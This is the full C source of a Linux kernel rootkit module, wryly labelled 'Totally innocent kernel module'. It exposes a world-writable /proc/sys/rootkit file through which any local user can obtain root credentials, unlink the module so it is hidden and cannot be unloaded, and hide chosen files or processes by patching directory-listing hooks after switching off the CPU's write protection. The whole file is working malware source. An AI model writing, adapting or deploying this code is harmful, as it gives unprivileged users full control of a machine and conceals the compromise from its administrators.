#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/cred.h>
#include <linux/uaccess.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/mutex.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Nobody important");
MODULE_DESCRIPTION("Totally innocent kernel module");
MODULE_VERSION("1.0");

#define log(...) printk(KERN_INFO "rootkit: " __VA_ARGS__)

typedef int (*iterate_fn)(struct file *, struct dir_context *);

// Info about a hidden file. The dir_inode is the
// parent directory inode number, and the file_name
// is the name of the file you want to hide. Duh.
// Note that inode numbers aren't unique, so for
// improvement we might want to also store the
// superblock.
struct file_info {
    struct list_head list;
    unsigned long dir_inode;
    char file_name[256];
};

// Trampoline info for a given file_operations table.
// Used to call the original implementation, and restore
// state upon module exit.
struct fops_hook {
    struct list_head list;
    struct file_operations *fops;
    iterate_fn iterate_orig;
    iterate_fn iterate_shared_orig;
    struct list_head hidden_file_list;
};
LIST_HEAD(fops_hook_list);

// Used as a kinda-hashmap to safely "pass"
// an extra parameter to the filldir hook.
// I tried making a wrapper dir_context combined
// with container_of(), but it causes the system
// to freeze for some reason.
struct filldir_context {
    struct list_head list;
    struct dir_context *context;
    filldir_t filldir_orig;
    char *hidden_filenames[32];
    int num_hidden_filenames;
};
LIST_HEAD(filldir_context_list);
DEFINE_MUTEX(filldir_context_lock);

// Buffer for copying strings into the kernel
static char cmd_buf[128];

// Enables writing to read-only pages.
static void yolo_begin(void)
{
    preempt_disable();
    barrier();
    write_cr0(read_cr0() & ~X86_CR0_WP);
}

// Disables writing to read-only pages.
static void yolo_end(void)
{
    write_cr0(read_cr0() | X86_CR0_WP);
    barrier();
    preempt_enable();
}

// Grants the calling process root permissions.
static int sysctl_escalate(void)
{
    struct cred *cred;
    
    log("Escalating caller creds to root\n");
    cred = prepare_kernel_cred(NULL);
    if (cred == NULL) {
        log("prepare_kernel_cred() failed\n");
        return -1;
    }
    return commit_creds(cred);
}

// Makes the module invisible. After this, should
// not see it in lsmod, and rmmod should fail to
// remove it. insmod will still fail since the
// kobject is still there and causes a name collision.
//
// Warning: the only way to unload the module after
// this is to reboot the machine!
static int sysctl_hide_self(void)
{
    // Don't double-hide
    if (THIS_MODULE->list.next == NULL ||
        THIS_MODULE->list.prev == NULL) {
        log("Module already hidden\n");
        return 0;
    }

    // Unlink this module from the list
    mutex_lock(&module_mutex);
    list_del_rcu(&THIS_MODULE->list);
    mutex_unlock(&module_mutex);
    THIS_MODULE->list.next = NULL;
    THIS_MODULE->list.prev = NULL;
    log("Module successfully hidden\n");
    return 0;
}

// Returns the file ops hook state give the
// specified file ops table. Returns NULL if
// there is no hook present for the table.
static struct fops_hook *get_fops_hook(const struct file_operations *fops)
{
    struct list_head *curr;
    list_for_each(curr, &fops_hook_list) {
        struct fops_hook *hook = list_entry(curr, struct fops_hook, list);
        if (hook->fops == fops) {
            return hook;
        }
    }
    return NULL;
}

// Returns the filldir context for the given
// dir_context. Used to retrieve the list of
// files to hide from within the filldir_hook
// function.
static struct filldir_context *get_filldir_context(struct dir_context *context)
{
    struct list_head *curr;
    mutex_lock(&filldir_context_lock);
    list_for_each(curr, &filldir_context_list) {
        struct filldir_context *fc = list_entry(curr, struct filldir_context, list);
        if (fc->context == context) {
            mutex_unlock(&filldir_context_lock);
            return fc;
        }
    }
    mutex_unlock(&filldir_context_lock);
    return NULL;
}

// Wrapper for the original filldir function
// that will filter out any file names that we
// want to hide.
static int filldir_hook(
    struct dir_context *context,
    const char *name,
    int name_len,
    loff_t offset,
    uint64_t ino,
    unsigned int d_type)
{
    int i;
    struct filldir_context *fc = get_filldir_context(context);
    BUG_ON(fc == NULL);

    // See if we should hide this file
    for (i = 0; i < fc->num_hidden_filenames; ++i) {
        if (strcmp(name, fc->hidden_filenames[i]) == 0) {
            log("File hidden: %s\n", name);
            return 0;
        }
    }

    // Delegate to original function
    return fc->filldir_orig(context, name, name_len, offset, ino, d_type);
}

// Wrapper for the file ops iterate() function.
// The call stack is like this:
//
//    getdents()
//      iterate(<filldir callback>)
//        <filldir callback>()
//
// In this function, we swizzle the filldir callback
// with filldir_hook(), then call the original iterate.
// That way, no matter which filesystem we're using,
// our filldir_hook() will be called.
static int iterate_hook(struct file *file, struct dir_context *context)
{
    int ret;
    struct filldir_context fc;
    struct list_head *curr;
    struct fops_hook *hook = get_fops_hook(file->f_op);
    BUG_ON(hook == NULL);

    // Build list of files we have to hide for this directory
    fc.context = context;
    fc.filldir_orig = context->actor;
    fc.num_hidden_filenames = 0;
    list_for_each(curr, &hook->hidden_file_list) {
        struct inode *inode;
        struct file_info *info = list_entry(curr, struct file_info, list);
        if (fc.num_hidden_filenames == ARRAY_SIZE(fc.hidden_filenames) - 1) {
            log("Too many hidden files, ignoring rest\n");
            break;
        }

        inode = file->f_path.dentry->d_inode;
        if (inode != NULL && inode->i_ino == info->dir_inode) {
            fc.hidden_filenames[fc.num_hidden_filenames++] = info->file_name;
        }
    }

    // If no files to hide, just call the original directly.
    // Otherwise, replace the actor with our modified version.
    if (fc.num_hidden_filenames != 0) {
        *((filldir_t *)&context->actor) = filldir_hook;
        mutex_lock(&filldir_context_lock);
        list_add(&fc.list, &filldir_context_list);
        mutex_unlock(&filldir_context_lock);
    }

    // Now call the original implementation
    if (hook->iterate_shared_orig != NULL) {
        ret = hook->iterate_shared_orig(file, context);
    } else if (hook->iterate_orig != NULL) {
        ret = hook->iterate_orig(file, context);
    } else {
        BUG();
    }

    // Finally, clean up that context we added earlier.
    if (fc.num_hidden_filenames != 0) {
        mutex_lock(&filldir_context_lock);
        list_del(&fc.list);
        mutex_unlock(&filldir_context_lock);
    }

    return ret;
}

// Hides a file. The file may still be opened, but
// attempts to ls the parent directory will not
// display the file. Hiding a file under /proc can
// also be used to hide the presence of a process.
//
// TODO: since there may be different file operations
// for the parent (e.g. /proc), we should do this
// based on path instead of parent dentry. Also, this
// doesn't work correctly (or maybe it does, depending
// on your intended result) on symlinks.
static int sysctl_hide_file(const char *path)
{
    int ret = -1;
    struct file *f;
    struct fops_hook *fops_hook = NULL;
    struct file_info *file_info = NULL;
    struct file_operations *fops = NULL;
    struct dentry *file_dentry, *parent_dentry;

    log("Hiding file: %s\n", path);

    // Open the file so we can get its file ops table
    f = filp_open(path, O_RDONLY, 0);
    if (IS_ERR(f)) {
        log("Path does not exist/cannot be opened\n");
        goto cleanup;
    }

    // Get parent dir entry
    file_dentry = f->f_path.dentry;
    parent_dentry = file_dentry->d_parent;
    if (parent_dentry == NULL) {
        log("Parent dentry is NULL\n");
        goto cleanup;
    }

    // Get parent dir's fops table (cast off const, but
    // note that #YOLO mode is required to actually
    // write to it)
    fops = (struct file_operations *)fops_get(parent_dentry->d_inode->i_fop);
    if (fops->iterate_shared == NULL && fops->iterate == NULL) {
        log("Parent path is not iterable\n");
        goto cleanup;
    }

    // Persist file info so we know which files were hidden in
    // the iterate hook
    file_info = kmalloc(sizeof(*file_info), GFP_KERNEL);
    if (file_info == NULL) {
        log("Failed to allocate file info\n");
        goto cleanup;
    }

    // Save file name and parent directory inode info
    file_info->dir_inode = parent_dentry->d_inode->i_ino;
    if (strscpy(file_info->file_name, file_dentry->d_name.name,
            sizeof(file_info->file_name)) < 0) {
        log("File name too long\n");
        goto cleanup;
    }

    // Allocate file ops hook, if we haven't done so already
    fops_hook = get_fops_hook(fops);
    if (fops_hook == NULL) {
        fops_hook = kmalloc(sizeof(*fops_hook), GFP_KERNEL);
        if (fops_hook == NULL) {
            log("Failed to allocate hook struct\n");
            goto cleanup;
        }

        // Save iterate function (used by getdents, which in turn
        // is used by readdir, which in turn is used by ls) in the
        // file ops table. Need to enable #YOLO mode, since file ops
        // tables are usually declared const.
        fops_hook->fops = fops;
        fops_hook->iterate_shared_orig = fops->iterate_shared;
        fops_hook->iterate_orig = fops->iterate;

        // Replace iterate and iterate_shared with our hacked version.
        // Note that iterate is the same as iterate_shared, but the
        // caller acquires the protecting semaphore in r/w mode instead
        // of r/o mode, so it's always safe to replace iterate with
        // iterate_shared (but not the other way around).
        yolo_begin();
        fops->iterate = iterate_hook;
        fops->iterate_shared = NULL;
        yolo_end();

        // Add hook into list (must come last, unless you want to
        // remove it in cleanup for whatever reason)
        list_add(&fops_hook->list, &fops_hook_list);

        INIT_LIST_HEAD(&fops_hook->hidden_file_list);
    }

    // Add this file to list of hidden files (per file operations hook)
    list_add(&file_info->list, &fops_hook->hidden_file_list);

    ret = 0;

cleanup:
    if (ret < 0) {
        if (fops_hook != NULL) {
            kfree(fops_hook);
        }

        if (file_info != NULL) {
            kfree(file_info);
        }

        if (fops != NULL) {
            fops_put(fops);
        }
    }

    if (!IS_ERR(f)) {
        filp_close(f, 0);
    }

    return ret;
}

// Used when the user reads from the sysctl file.
// Copies the given src string into the provided
// userspace buffer.
static int sysctl_strcpy_to_user(
    const char *src,
    char __user *buffer,
    size_t *lenp,
    loff_t *ppos)
{
    size_t buf_len, copy_len;
    loff_t start;

    buf_len = strlen(src);
    start = *ppos;
    copy_len = *lenp;

    if (start >= buf_len) {
        *lenp = 0;
        return 0;
    }

    if (copy_len > buf_len - start) {
        copy_len = buf_len - start;
    }

    if (copy_to_user(buffer, &src[start], copy_len)) {
        return -EFAULT;
    }

    *lenp = copy_len;
    *ppos += copy_len;
    return 0;
}

// Used when the user reads from the sysctl file.
// Copies the given src string into the provided
// userspace buffer.
static int sysctl_strcpy_to_kernel(
    char buffer[],
    size_t buf_len,
    char __user *src,
    size_t *lenp,
    loff_t *ppos)
{
    size_t copy_len;
    loff_t start;

    start = *ppos;
    copy_len = *lenp;

    if (copy_len > buf_len) {
        copy_len = buf_len;
    }

    if (copy_from_user(buffer, &src[start], copy_len)) {
        return -EFAULT;
    }

    buffer[buf_len - 1] = '\0';
    buffer[strcspn(buffer, "\r\n")] = '\0';

    return *lenp - copy_len;
}

// Gets called when a read/write to the /proc/sys/rootkit
// file occurs.
//
// To test read: cat /proc/sys/rootkit
// To test write: echo "foo" > /proc/sys/rootkit
static int sysctl_handler(
    struct ctl_table *ctl,
    int write,
    void __user *buffer,
    size_t *lenp,
    loff_t *ppos)
{
    if (!write) {
        return sysctl_strcpy_to_user("not_a_virus.mp3.doc.zip.exe\n", buffer, lenp, ppos);
    } else {
        sysctl_strcpy_to_kernel(cmd_buf, sizeof(cmd_buf), buffer, lenp, ppos);
    }

    if (strcmp(cmd_buf, "i_can_haz_root") == 0) {
        return sysctl_escalate();
    } else if (strcmp(cmd_buf, "im_in_ur_kernel") == 0) {
        return sysctl_hide_self();
    } else if (strncmp(cmd_buf, "cant_touch_this ", strlen("cant_touch_this ")) == 0) {
        return sysctl_hide_file(&cmd_buf[strlen("cant_touch_this ")]);
    } else {
        log("Unknown command: %s\n", cmd_buf);
        return -EINVAL;
    }
}

// Defines our entry in /proc/sys/rootkit
static struct ctl_table_header *ctl_hdr;
static struct ctl_table ctl_table[] = {
    {
        .procname = "rootkit",
        .data = cmd_buf,
        .maxlen = sizeof(cmd_buf),
        .mode = 0666,
        .child = NULL,
        .proc_handler = &sysctl_handler,
        .poll = NULL,
        .extra1 = NULL,
        .extra2 = NULL,
    },
    {}
};

// Called when the rootkit is loaded into the kernel
static int __init rootkit_init(void)
{
    ctl_hdr = register_sysctl_table(ctl_table);
    log("Rootkit installed\n");
    return 0;
}

// Called when the rootkit is unloaded from the kernel
static void __exit rootkit_exit(void)
{
    struct list_head *curr, *n;
    unregister_sysctl_table(ctl_hdr);

    list_for_each_safe(curr, n, &fops_hook_list) {
        struct list_head *info_curr, *info_n;

        // Restore original iterate functions
        struct fops_hook *hook = list_entry(curr, struct fops_hook, list);
        yolo_begin();
        hook->fops->iterate = hook->iterate_orig;
        hook->fops->iterate_shared = hook->iterate_shared_orig;
        yolo_end();

        // Clear list of hooked files
        list_for_each_safe(info_curr, info_n, &hook->hidden_file_list) {
            struct file_info *info = list_entry(info_curr, struct file_info, list);
            list_del(info_curr);
            kfree(info);
        }

        // Delete fop hook from list
        list_del(curr);
        fops_put(hook->fops);
        kfree(hook);
    }

    log("Rootkit uninstalled\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
